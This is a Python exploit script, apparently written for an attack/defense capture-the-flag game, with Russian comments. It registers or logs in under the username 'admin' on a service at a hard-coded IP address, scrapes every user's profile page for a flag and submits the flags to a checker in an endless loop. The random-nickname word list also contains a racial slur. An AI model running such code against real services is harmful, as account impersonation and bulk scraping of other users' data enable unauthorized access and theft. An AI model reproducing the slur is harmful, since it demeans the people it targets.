import requests
from bs4 import BeautifulSoup
import random
import time

session = requests.Session()
url = "http://62.181.44.12:3000"


adjectives = ["swift", "brave", "clever", "silent", "golden"]
nouns = ["eagle", "shadow", "river", "nigger", "mountain", "star"]
special_chars = ["_", "-", "."]


def random_nickname():
    adj = random.choice(adjectives)
    noun = random.choice(nouns)
    char = random.choice(special_chars)
    num = random.randint(1,9999)

    return f"{adj}_{noun}_{char}_{num}"

def flag_checker(flag):
    urlz = 'http://62.181.44.12:3000/check-flag?flag='
    request = session.get(url=urlz+flag)
    if (request.text == "Верный флаг"):
        return 1
    return 0



# регистрируемся с указанием юзернейма - админ
full_name = ""
username = "admin"
password = "123"
login_flag = 0

with open("user.txt", "r+") as f:
    get_user_info = f.readline()
    if len(get_user_info) == 0:
        full_name = random_nickname()
        f.write(full_name)
        print(f"Сгенерировал юзера: {full_name}. Записал данные созданного юзера в файл user.txt")
    else:
        full_name = get_user_info
        login_flag = 1

email = full_name + "@gmail.com"
reg_data = {"username": username,
                    "email" : email,
                    "full_name": full_name,
                    "password": password,
                    "confirm_password": password}

parse_permisson = 0

if login_flag:
    login_post = session.post(url+"/auth/signin", data=reg_data)
    if login_post.status_code == 200:
        print("Залогинился :)")
        parse_permisson = 1
    else:
        print("Произошла ошибка при логине!!!")
else:
    registration_post = session.post(url+"/auth/signup", data=reg_data)
    if registration_post.status_code == 200:
        print("Зарегестрировался :)")
        parse_permisson = 1
    else:
        print("Произошла ошибка при регистрации!!!")


while parse_permisson:
    # достаем страницы всех пользователей
    list_all_users_get_html = session.get(url).text
    soup_users = BeautifulSoup(list_all_users_get_html, 'lxml')

    view_profile_tags = soup_users.find_all('a', class_="btn btn-view-profile")

    # проходимся в обратном порядке по всем пользователям. Берем флаг и подставляем в жюрийку
    for data in view_profile_tags[::-1]:
        user_element = data['href']

        done = 0 
        get_user_info = session.get(url=url+user_element) # получаем html-страницу юзера
        soup = BeautifulSoup(get_user_info.text, 'lxml')
        flag_span = soup.find_all("span") # достаем <span> </span>, где лежит флаг
        username_h1 = soup.find_all("h1") # достаем <span> </span>, где лежит флаг
        
        print(f"Проверяю пользователя -- {username_h1[0].text}")

        if len(flag_span) >= 4: # не у всех юзеров есть элемент <span> флага, таких отбрасываем
            flag = str(flag_span[3].text)
            done = flag_checker(flag)
            print(f"Подставляю найденный флаг ({flag})...")
            if (done):
                print(f"Ура! Этот флаг верный! Жду 30 сек для обновления флага...")
                time.sleep(30)
                break
        